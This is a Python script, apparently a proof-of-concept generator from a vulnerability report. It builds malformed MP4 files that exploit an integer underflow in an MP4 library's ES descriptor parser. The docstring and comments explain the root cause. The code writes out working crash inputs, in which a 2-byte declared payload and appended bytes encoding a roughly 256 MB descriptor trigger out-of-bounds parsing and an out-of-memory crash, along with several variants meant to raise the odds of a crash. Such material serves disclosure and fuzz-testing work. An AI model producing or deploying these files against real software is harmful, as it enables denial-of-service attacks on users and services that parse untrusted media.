#!/usr/bin/env python3
"""
VULN-003 PoC Generator:
AP4_EsDescriptor substream size integer underflow enables OOB descriptor parse.
CWE-191 (Integer Underflow) -> CWE-125 (Out-of-bounds Read)

Root cause (Ap4EsDescriptor.cpp line 103):
  AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                   payload_size - AP4_Size(offset - start));
When payload_size=2 and the constructor reads 3 bytes (ReadUI16 + ReadUI08),
offset-start=3, giving 2-3 = 0xFFFFFFFF (uint32 underflow).
The SubStream is created with m_Size=0xFFFFFFFF, causing far-boundary reads.

Trigger path: moov/trak/mdia/minf/stbl/stsd/mp4a/esds with ES_Descriptor
tag=0x03 and payload_size=2.

Extra bytes after the 2-byte payload force the overflow SubStream to parse a
fake UnknownDescriptor with ~256 MB payload, triggering OOM (std::bad_alloc).
"""

import struct
import os
import sys

POC_DIR = os.path.dirname(os.path.abspath(__file__))


def pack_box(fourcc, payload):
    """4-byte BE size + 4-char fourcc + payload."""
    size = 8 + len(payload)
    return struct.pack('>I4s', size, fourcc.encode('ascii')) + payload


def pack_full_box(fourcc, version, flags, payload):
    """FullBox: size + fourcc + version(1) + flags(3) + payload."""
    hdr = struct.pack('>BBBB',
                      version & 0xFF,
                      (flags >> 16) & 0xFF,
                      (flags >> 8) & 0xFF,
                      flags & 0xFF)
    return pack_box(fourcc, hdr + payload)


def build_mp4(payload_size_val, include_extra):
    """
    Build a minimal MP4 with an esds atom containing an ES_Descriptor
    (tag=0x03) whose declared payload_size is payload_size_val.

    When include_extra=True, extra bytes are appended inside the esds box
    past the declared ES_Descriptor payload.  The extra bytes cause the
    overflow SubStream (m_Size=0xFFFFFFFF) to parse a descriptor whose
    encoded size is ~256 MB, triggering a std::bad_alloc / OOM crash.

    File layout:
      ftyp
      moov
        mvhd
        trak
          tkhd
          mdia
            mdhd
            hdlr
            minf
              smhd
              dinf
                dref
                  url
              stbl
                stsd
                  mp4a
                    esds   <- vulnerable atom
                stts
                stsc
                stsz
                stco
    """

    # --- ftyp ----------------------------------------------------------
    ftyp = pack_box('ftyp',
        b'M4A ' +
        struct.pack('>I', 0) +         # minor_version
        b'M4A ' + b'isom' + b'mp42'   # compatible_brands
    )

    # --- mvhd (version=0) ---------------------------------------------
    matrix = struct.pack('>9i',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    mvhd = pack_full_box('mvhd', 0, 0,
        struct.pack('>IIIII', 0, 0, 44100, 0, 0x00010000) +  # ctime,mtime,ts,dur,rate
        struct.pack('>H', 0x0100) +    # volume  1.0
        b'\x00' * 10 +                 # reserved (2+8)
        matrix +                       # 36 bytes
        b'\x00' * 24 +                 # pre_defined
        struct.pack('>I', 2)           # next_track_id
    )

    # --- tkhd (version=0, flags=3: enabled+in_movie) ------------------
    tkhd = pack_full_box('tkhd', 0, 3,
        struct.pack('>IIIII', 0, 0, 1, 0, 0) +   # ctime,mtime,track_id,reserved,dur
        b'\x00' * 8 +                              # reserved
        struct.pack('>hh', 0, 0) +                 # layer, alternate_group
        struct.pack('>H', 0x0100) +                # volume 1.0
        b'\x00' * 2 +                              # reserved
        matrix +                                   # 36 bytes
        struct.pack('>II', 0, 0)                   # width, height (0 for audio)
    )

    # --- mdhd (version=0) ---------------------------------------------
    mdhd = pack_full_box('mdhd', 0, 0,
        struct.pack('>IIII', 0, 0, 44100, 0) +    # ctime,mtime,timescale,duration
        struct.pack('>HH', 0x55C4, 0)              # language='und', pre_defined=0
    )

    # --- hdlr (SoundHandler) ------------------------------------------
    hdlr = pack_full_box('hdlr', 0, 0,
        struct.pack('>I', 0) +         # pre_defined
        b'soun' +                      # handler_type
        b'\x00' * 12 +                 # reserved
        b'SoundHandler\x00'            # name (null-terminated)
    )

    # --- smhd (balance=0) --------------------------------------------
    smhd = pack_full_box('smhd', 0, 0,
        struct.pack('>HH', 0, 0)       # balance, reserved
    )

    # --- url (self-contained, flags=1) --------------------------------
    url_box = pack_full_box('url ', 0, 1, b'')

    # --- dref ---------------------------------------------------------
    dref = pack_full_box('dref', 0, 0,
        struct.pack('>I', 1) + url_box
    )

    # --- dinf ---------------------------------------------------------
    dinf = pack_box('dinf', dref)

    # ------------------------------------------------------------------
    # Craft the esds atom with the vulnerable ES_Descriptor.
    #
    # Positions within the esds box (relative to box start):
    #   0-7  : size + 'esds'
    #   8-11 : version(1) + flags(3)   <- full-box header
    #   12   : ES_Descriptor tag = 0x03
    #   13   : payload_size_val
    #   14+  : payload (2 bytes declared; any extra bytes follow)
    #
    # AP4_EsDescriptor reads:
    #   ReadUI16(m_EsId)  -> 2 bytes (positions 14-15)
    #   ReadUI08(bits)    -> 1 byte  (position 16, OUTSIDE declared payload)
    # Then computes:
    #   substream_size = payload_size_val - AP4_Size(offset - start) = p - 3
    # With p=2 -> 2-3 = 0xFFFFFFFF (uint32 underflow!)
    # Substream size 0xFFFFFFFF causes far-boundary descriptor parsing.
    #
    # Extra bytes (if include_extra):
    #   +0 (pos 16): 0x00  <- ReadUI08(bits) reads this; flags=0, priority=0
    #   +1 (pos 17): 0x06  <- SubStream reads as unknown descriptor tag
    #   +2..+5      : 0xFF 0xFF 0xFF 0x7F  <- MPEG-4 extended size encoding
    #                 decoded value: ~256 MB (268 435 455 bytes)
    #   -> AP4_UnknownDescriptor tries new AP4_Byte[268435455] -> OOM/crash
    # ------------------------------------------------------------------

    es_payload_bytes = bytes([0xAA, 0xBB])[:payload_size_val]  # declared payload
    es_descriptor = bytes([0x03, payload_size_val & 0xFF]) + es_payload_bytes

    extra = b''
    if include_extra:
        extra = bytes([
            0x00,               # bits byte: flags=0, stream_priority=0
            0x06,               # unknown descriptor tag  (not ES/OD/IOD)
            0xFF, 0xFF, 0xFF,   # MPEG-4 extended-size ext bytes (has_more=1)
            0x7F,               # final size byte: payload_size = 268435455
        ])

    esds = pack_full_box('esds', 0, 0, es_descriptor + extra)

    # --- mp4a AudioSampleEntry ----------------------------------------
    # 6 reserved + 2 data_ref_idx + 8 reserved + 2 channelcount +
    # 2 samplesize + 2 pre_defined + 2 reserved + 4 samplerate(16.16)
    mp4a_inner = (
        b'\x00' * 6 +
        struct.pack('>H', 1) +                     # data_reference_index
        b'\x00' * 8 +                              # AudioSampleEntry reserved
        struct.pack('>HHHHI', 2, 16, 0, 0,
                    44100 << 16)                   # ch, sz, pre_def, rsv, rate (16.16 fixed)
    )
    mp4a = pack_box('mp4a', mp4a_inner + esds)

    # --- stsd ---------------------------------------------------------
    stsd = pack_full_box('stsd', 0, 0,
        struct.pack('>I', 1) + mp4a    # entry_count=1
    )

    # --- stts, stsc, stsz, stco (all empty) --------------------------
    stts = pack_full_box('stts', 0, 0, struct.pack('>I', 0))
    stsc = pack_full_box('stsc', 0, 0, struct.pack('>I', 0))
    stsz = pack_full_box('stsz', 0, 0, struct.pack('>II', 0, 0))
    stco = pack_full_box('stco', 0, 0, struct.pack('>I', 0))

    # --- stbl ---------------------------------------------------------
    stbl = pack_box('stbl', stsd + stts + stsc + stsz + stco)

    # --- minf ---------------------------------------------------------
    minf = pack_box('minf', smhd + dinf + stbl)

    # --- mdia ---------------------------------------------------------
    mdia = pack_box('mdia', mdhd + hdlr + minf)

    # --- trak ---------------------------------------------------------
    trak = pack_box('trak', tkhd + mdia)

    # --- moov ---------------------------------------------------------
    moov = pack_box('moov', mvhd + trak)

    return ftyp + moov


# ------------------------------------------------------------------
# Generate several variants to maximise crash probability
# ------------------------------------------------------------------
variants = [
    # (payload_size, include_extra, suffix description)
    (2, True,  'p2_extra'),   # primary: payload=2 + OOM-trigger extra bytes
    (2, False, 'p2_plain'),   # payload=2, no extra bytes (logic bug, no OOM)
    (1, True,  'p1_extra'),   # payload=1 + extra
    (0, True,  'p0_extra'),   # payload=0 + extra (largest underflow)
]

# Write the primary PoC file first (payload_size=2 with extra bytes)
primary_path = os.path.join(POC_DIR, 'vuln_003.mp4')
primary_data = build_mp4(2, True)
with open(primary_path, 'wb') as f:
    f.write(primary_data)
print(f'[+] Generated primary PoC: {primary_path} ({len(primary_data)} bytes)')

# Write all variants
for ps, extra, sfx in variants:
    data = build_mp4(ps, extra)
    path = os.path.join(POC_DIR, f'vuln_003_{sfx}.mp4')
    with open(path, 'wb') as f:
        f.write(data)
    print(f'[+] Variant {sfx}: {path} ({len(data)} bytes)')

print('[+] All PoC files written.')
